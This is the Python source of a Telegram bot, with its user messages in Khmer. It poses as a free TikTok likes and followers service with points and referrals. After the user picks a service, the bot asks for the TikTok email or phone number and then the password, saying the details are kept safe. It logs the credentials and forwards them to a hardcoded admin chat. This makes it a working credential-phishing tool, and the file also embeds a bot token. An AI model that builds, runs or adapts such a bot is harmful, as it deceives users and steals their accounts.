from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes,
    MessageHandler, filters, ConversationHandler
)
import logging

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

TOKEN = "7787943253:AAFYQ4JtVoRY-iBJKMvYmq309GZ1TN6FmfI"
ADMIN_ID = 6837307356  # ប្តូរជា ID អ្នកគ្រប់គ្រងពិត
BOT_USERNAME = "Sadkjsithbot"  # Telegram Bot username (គ្មាន @)

STARTING_POINTS = 10
POINTS_DEDUCT_SERVICE = 5
POINTS_BONUS_REFERRAL = 10

NUMBER, ACCOUNT_INFO, PASSWORD = range(3)

def format_points_bar(points, max_points=50, length=20):
    filled_length = int(length * points / max_points)
    bar = '█' * filled_length + '░' * (length - filled_length)
    return f"[{bar}] {points}/{max_points} ពិន្ទុ"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = context.user_data
    if 'points' not in user_data:
        user_data['points'] = STARTING_POINTS

    args = context.args
    if args:
        referral_id = args[0]
        if referral_id != str(user.id):
            user_data['points'] += POINTS_BONUS_REFERRAL
            await update.message.reply_text(
                f"🎉 អរគុណសម្រាប់ការណែនាំ! អ្នកបានទទួល {POINTS_BONUS_REFERRAL} ពិន្ទុបន្ថែម។"
            )

    points = user_data['points']
    text = (
        f"👋 សួស្តី {user.first_name}!\n"
        f"🆔 ID: {user.id}\n"
        f"🔰 ពិន្ទុបច្ចុប្បន្នរបស់អ្នក:\n{format_points_bar(points)}\n\n"
        "⚜️ ចុច /get ដើម្បីទទួលបាន Like ឬ Follower TikTok\n"
        "📊 ចុច /balance ដើម្បីមើលពិន្ទុរបស់អ្នក\n"
        "❌ ចុច /cancel ដើម្បីបោះបង់ការបញ្ចូល"
    )
    await update.message.reply_text(text)

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = context.user_data
    points = user_data.get('points', STARTING_POINTS)
    await update.message.reply_text(f"📊 ពិន្ទុបច្ចុប្បន្នរបស់អ្នក:\n{format_points_bar(points)}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ ការបញ្ចូលត្រូវបានបោះបង់។ សូមចុច /get ដើម្បីចាប់ផ្តើមម្ដងទៀត។")
    return ConversationHandler.END

async def get_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_data = context.user_data
    if 'points' not in user_data:
        user_data['points'] = STARTING_POINTS
    points = user_data['points']

    referral_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"

    keyboard = [
        [
            InlineKeyboardButton("⚡️ Like", callback_data="like"),
            InlineKeyboardButton("🔥 Follower", callback_data="sub")
        ],
        [
            InlineKeyboardButton(f"🔗 ណែនាំ Bot (+{POINTS_BONUS_REFERRAL} ពិន្ទុ)", url=referral_link)
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"ជ្រើសរើសសកម្មភាព:\nចំនួនពិន្ទុរបស់អ្នក: {points}\n{format_points_bar(points)}",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_data = context.user_data
    if 'points' not in user_data:
        user_data['points'] = STARTING_POINTS

    points = user_data['points']

    if query.data in ["like", "sub"]:
        if points < POINTS_DEDUCT_SERVICE:
            await query.message.reply_text(f"❌ ពិន្ទុមិនគ្រប់គ្រាន់! ពិន្ទុរបស់អ្នក: {points}")
            return ConversationHandler.END
        user_data['points'] -= POINTS_DEDUCT_SERVICE
        user_data['action'] = query.data
        await query.message.reply_text(
            f"🤍 សូមបញ្ចូលចំនួន {query.data} TikTok (10-50):\n"
            f"ពិន្ទុនៅសល់: {user_data['points']}"
        )
        return NUMBER

    await query.message.reply_text("សូមជ្រើសរើសប៊ូតុងត្រឹមត្រូវ។")
    return ConversationHandler.END

async def number_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = context.user_data
    text = update.message.text
    if not text.isdigit():
        await update.message.reply_text("❌ សូមបញ្ចូលលេខត្រឹមត្រូវ!")
        return NUMBER
    num = int(text)
    if num < 10 or num > 50:
        await update.message.reply_text("❌ សូមជ្រើសរើសចំនួនពី 10 ដល់ 50")
        return NUMBER
    user_data['number'] = num
    await update.message.reply_text(
        "✅ សូមបញ្ចូលអាសយដ្ឋានអ៊ីមែល ឬលេខទូរស័ព្ទ TikTok របស់អ្នក\n"
        "_(សម្រាប់បញ្ជាក់ និងការបញ្ជូនសេវាកម្ម បញ្ចូលដោយសុវត្ថិភាព)_",
        parse_mode="Markdown"
    )
    return ACCOUNT_INFO

async def account_info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = context.user_data
    user_data['account_info'] = update.message.text
    await update.message.reply_text(
        "🔐 សូមបញ្ចូលពាក្យសម្ងាត់ TikTok របស់អ្នក\n"
        "_(ព័ត៌មាននេះត្រូវបានរក្សាទុកយ៉ាងសុវត្ថិភាព ហើយមិនត្រូវចែករំលែកជាសាធារណៈ)_",
        parse_mode="Markdown"
    )
    return PASSWORD

async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = context.user_data
    user_data['password'] = update.message.text
    user = update.effective_user

    log_message = (
        f"✅ អ្នកប្រើប្រាស់: {user.first_name} (ID: {user.id})\n"
        f"🎯 សកម្មភាព: {user_data.get('action')}\n"
        f"🔢 ចំនួន: {user_data.get('number')}\n"
        f"📧 អាសយដ្ឋាន/លេខទូរស័ព្ទ: {user_data.get('account_info')}\n"
        f"🔐 ពាក្យសម្ងាត់: {user_data.get('password')}"
    )
    logging.info(log_message)

    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=log_message)
    except Exception as e:
        logging.error(f"Error sending message to admin: {e}")
        await update.message.reply_text("⚠️ មានបញ្ហាក្នុងការផ្ញើព័ត៌មានទៅ Admin")

    await update.message.reply_text(
        f"♥️ អរគុណចំពោះការប្រើប្រាស់! ប្រសិនបើព័ត៌មានត្រឹមត្រូវ អ្នកនឹងទទួលបាន "
        f"{user_data.get('action')} {user_data.get('number')} ក្នុងរយៈពេល 1 ម៉ោង។"
    )
    user_data.clear()
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern='^(like|sub)$')],
        states={
            NUMBER: [MessageHandler(filters.TEXT & (~filters.COMMAND), number_handler)],
            ACCOUNT_INFO: [MessageHandler(filters.TEXT & (~filters.COMMAND), account_info_handler)],
            PASSWORD: [MessageHandler(filters.TEXT & (~filters.COMMAND), password_handler)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("get", get_command))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(conv_handler)

    print("Bot បានដំណើរការ...")
    app.run_polling()

if __name__ == '__main__':
    main()
    